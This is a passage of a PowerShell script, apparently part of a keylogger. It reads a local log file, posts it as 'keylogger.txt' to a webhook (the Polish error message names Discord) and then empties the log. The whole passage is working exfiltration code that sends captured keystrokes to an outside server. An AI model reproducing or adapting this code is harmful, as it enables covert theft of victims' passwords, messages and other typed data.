    if (Test-Path $logPath) {
        try {
            $fileBytes = [System.IO.File]::ReadAllBytes($logPath)
            $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
            $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::new("text/plain")

            $multiPart = [System.Net.Http.MultipartFormDataContent]::new()
            $multiPart.Add($fileContent, "file", "keylogger.txt")

            $client = New-Object System.Net.Http.HttpClient
            $client.PostAsync($webhook, $multiPart).Result

            Clear-Content -Path $logPath
        } catch {
            Write-Host "❌ Błąd wysyłania pliku do Discorda: $_"
        }
    }
}
